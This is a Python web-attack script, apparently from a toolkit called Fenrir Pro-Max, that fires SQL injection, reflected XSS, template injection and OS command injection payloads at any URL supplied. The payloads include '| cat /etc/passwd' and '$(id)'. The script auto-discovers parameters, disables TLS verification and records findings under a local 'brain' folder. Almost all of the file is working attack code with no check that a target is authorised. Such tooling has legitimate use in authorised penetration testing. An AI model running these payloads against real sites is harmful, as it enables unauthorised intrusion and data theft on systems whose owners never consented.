#!/usr/bin/env python3
"""Fenrir Pro-Max — Vulnerability Injection Testing Script

Usage:
    python3 fenrir/scripts/injection_test.py <url> <param> <type>
    python3 fenrir/scripts/injection_test.py <url> --auto
Types: sqli, xss, ssti, cmdi, all

Auto mode: discovers params from page source and tests all types.
"""
from __future__ import annotations
import json
import os
import re
import sys
import time
import ssl
from datetime import datetime
from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode


SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

BRAIN_DIR = Path.home() / ".fenrir" / "brain"

# ─── Payload Definitions ───

SQLI_PAYLOADS = [
    ("' OR '1'='1", "boolean"),
    ("' OR '1'='1' --", "boolean_comment"),
    ("' OR 1=1 --", "numeric_bool"),
    ("1' ORDER BY 1--", "order_by"),
    ("1' ORDER BY 100--", "order_by_large"),
    ("' UNION SELECT NULL --", "union"),
    ("' UNION SELECT 1,2,3 --", "union_3col"),
    ("1' AND SLEEP(5)--", "time_based"),
    ("admin'--", "auth_bypass"),
]

SQLI_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"valid MySQL", r"MySQL", r"mysql",
    r"PostgreSQL.*ERROR", r"psql", r"org\.postgresql",
    r"ORA-\d{4,5}", r"Oracle.*error",
    r"Microsoft.*JET.*Engine", r"ODBC SQL Server",
    r"SqlException", r"SQLite.*SQLException", r"sqlite",
    r"Unclosed quotation mark", r"unexpected end of SQL",
    r"You have an error.*SQL syntax", r"Warning.*pg_",
    r"Syntax error", r"Incorrect syntax",
    r"com\.microsoft\.sqlserver",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    '" onmouseover="alert(1)" x="',
    "</script><script>alert(1)</script>",
]

XSS_INDICATORS = [
    "<script>alert(1)</script>",
    "alert(1)",
    "onerror=alert",
    "onload=alert",
    "onmouseover=alert",
    "<svg",
    "<img src=x",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{self}}",
    "${{7*7}}",
]

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; whoami",
    "| cat /etc/passwd",
]

CMDI_INDICATORS = [
    "uid=", "gid=", "root:", "nobody:", "daemon:",
    "total ", "drwx", "www-data",
]

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


def http_get(url: str, params: dict | None = None, timeout: int = 10) -> dict:
    """HTTP GET with optional params. Returns {status, body, headers}."""
    try:
        full = url
        if params:
            full += "?" + urlencode(params)
        req = Request(full, headers={"User-Agent": UA})
        resp = urlopen(req, timeout=timeout, context=SSL_CTX)
        return {"status": resp.status, "body": resp.read().decode("utf-8", errors="ignore"), "headers": dict(resp.headers)}
    except HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore") if e.fp else ""
        return {"status": e.code, "body": body, "headers": dict(e.headers)}
    except Exception as e:
        return {"error": str(e)}


def test_sqli(base_url: str, param: str, timeout: int = 8) -> list[dict]:
    """Test a parameter for SQL injection."""
    findings = []
    # Get baseline
    baseline = http_get(base_url, {param: "benign_test_value"}, timeout)
    baseline_body = baseline.get("body", "")

    for payload, ptype in SQLI_PAYLOADS:
        try:
            result = http_get(base_url, {param: payload}, timeout)
            if "error" in result:
                continue
            body = result.get("body", "")

            # Check for SQL error patterns
            for pattern in SQLI_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    finding = {
                        "type": "sql_injection",
                        "subtype": "error_based",
                        "url": base_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"SQL error matched: {pattern}",
                    }
                    if finding not in findings:
                        findings.append(finding)
                    break

            # Check for boolean-based: different response vs falsy
            if ptype == "boolean":
                falsy = http_get(base_url, {param: "' OR '1'='2"}, timeout)
                falsy_body = falsy.get("body", "")
                if body and falsy_body and len(body) != len(falsy_body) and len(base_url) > 0:
                    finding = {
                        "type": "sql_injection",
                        "subtype": "boolean_blind",
                        "url": base_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"Different response length vs falsy payload ({len(body)} vs {len(falsy_body)})",
                    }
                    if finding not in findings:
                        findings.append(finding)
        except:
            pass

    return findings


def test_xss(base_url: str, param: str, timeout: int = 8) -> list[dict]:
    """Test a parameter for reflected XSS."""
    findings = []
    for payload in XSS_PAYLOADS:
        try:
            result = http_get(base_url, {param: payload}, timeout)
            if "error" in result:
                continue
            body = result.get("body", "")

            # Check if payload is reflected unescaped
            for indicator in XSS_INDICATORS:
                if indicator.lower() in body.lower() and payload.lower() in body.lower():
                    finding = {
                        "type": "xss",
                        "subtype": "reflected",
                        "url": base_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"Payload reflected: {payload[:80]}",
                    }
                    if finding not in findings:
                        findings.append(finding)
                    break
        except:
            pass

    return findings


def test_ssti(base_url: str, param: str, timeout: int = 8) -> list[dict]:
    """Test for Server-Side Template Injection."""
    findings = []
    baseline = http_get(base_url, {param: "shannon_test_marker"}, timeout)
    baseline_body = baseline.get("body", "")

    for payload in SSTI_PAYLOADS:
        try:
            result = http_get(base_url, {param: payload}, timeout)
            if "error" in result:
                continue
            body = result.get("body", "")

            if "49" in body and "49" not in baseline_body:
                finding = {
                    "type": "ssti",
                    "url": base_url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": "Template evaluated 7*7=49",
                }
                if finding not in findings:
                    findings.append(finding)
        except:
            pass

    return findings


def test_cmdi(base_url: str, param: str, timeout: int = 10) -> list[dict]:
    """Test for OS command injection."""
    findings = []
    for payload in CMDI_PAYLOADS:
        try:
            result = http_get(base_url, {param: payload}, timeout=timeout)
            if "error" in result:
                continue
            body = result.get("body", "")
            for indicator in CMDI_INDICATORS:
                if indicator.lower() in body.lower():
                    finding = {
                        "type": "command_injection",
                        "url": base_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"OS command indicator: {indicator}",
                    }
                    if finding not in findings:
                        findings.append(finding)
                    break
        except:
            pass

    return findings


def discover_params(url: str) -> list[str]:
    """Discover parameters on the page."""
    result = http_get(url)
    body = result.get("body", "")
    if not body:
        return []
    params = []
    for m in re.findall(r'(?:name|id)\s*=\s*"([^"]+)"', body):
        if m.lower() not in ("csrf", "token", "_token"):
            params.append(m)
    for m in re.findall(r'href="[^"]*\?([^"]+)"', body):
        params.extend(m.split("&"))
        params = [p.split("=")[0] for p in params]
    return list(set(params))[:20]


def save_to_brain(target: str, findings: list[dict]):
    """Save vuln findings to brain."""
    td = BRAIN_DIR / "targets" / target.replace("://", "_").replace("/", "_").replace(".", "_")
    td.mkdir(parents=True, exist_ok=True)
    vulns_file = td / "vulns.md"
    if not vulns_file.exists():
        vulns_file.write_text(f"# Vulnerability Report: {target}\nLast updated: {datetime.utcnow().isoformat()}\n---\n")
    ts = datetime.utcnow().isoformat()
    for f in findings:
        entry = f"\n## [{f.get('type', 'unknown').upper()}] - {ts}\n"
        for k, v in f.items():
            entry += f"**{k}**: {str(v)[:300]}\n"
        with open(vulns_file, "a") as fh:
            fh.write(entry + "\n")


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 fenrir/scripts/injection_test.py <url> [param] [type|all]")
        print("  <url>     Base URL to test (e.g., http://target.com/search)")
        print("  [param]   Parameter name (e.g., q). If omitted, auto-discover.")
        print("  [type]    Test type: sqli, xss, ssti, cmdi, all (default: all)")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else None
    test_type = sys.argv[3] if len(sys.argv) > 3 else "all"

    tests = {
        "sqli": ("SQL Injection", test_sqli, 8),
        "xss": ("XSS", test_xss, 8),
        "ssti": ("SSTI", test_ssti, 8),
        "cmdi": ("Command Injection", test_cmdi, 10),
    }

    if test_type == "all":
        test_list = list(tests.items())
    elif test_type in tests:
        test_list = [(test_type, tests[test_type])]
    else:
        print(f"Unknown type: {test_type}")
        sys.exit(1)

    # Discover params if not specified
    if not param:
        print(f"[DISCOVERY] Finding parameters on {url}...")
        param = discover_params(url)
        if not param:
            # Try common params
            param = ["q", "id", "search", "query", "name", "page"]
            print(f"  No params found, testing common: {param}")
        else:
            print(f"  Found {len(param)} parameters: {', '.join(param[:10])}")

    if isinstance(param, str):
        param = [param]

    all_findings = []

    for pname in param:
        print(f"\n{'='*50}")
        print(f"Testing parameter: {pname}")
        print(f"{'='*50}")

        for tkey, (tname, tfunc, ttimeout) in test_list:
            print(f"  [{tname}] Testing...")
            found = tfunc(url, pname, timeout=ttimeout)
            if found:
                print(f"  [FOUND] {len(found)} {tname} finding(s)!")
                for f in found:
                    print(f"    - {f.get('subtype', 'direct')}: {f.get('evidence', '')[:100]}")
                all_findings.extend(found)
            else:
                print(f"  [CLEAN] No {tname} detected")

    # Save findings
    if all_findings:
        target = url.split("/")[2] if "//" in url else url.split("/")[0].split(":")[0]
        save_to_brain(target, all_findings)
        print(f"\n\n[RESULT] Total: {len(all_findings)} confirmed findings saved to brain")
    else:
        print(f"\n\n[RESULT] No confirmed vulnerabilities found")

    # Summary
    print(json.dumps(all_findings, indent=2))


if __name__ == "__main__":
    main()
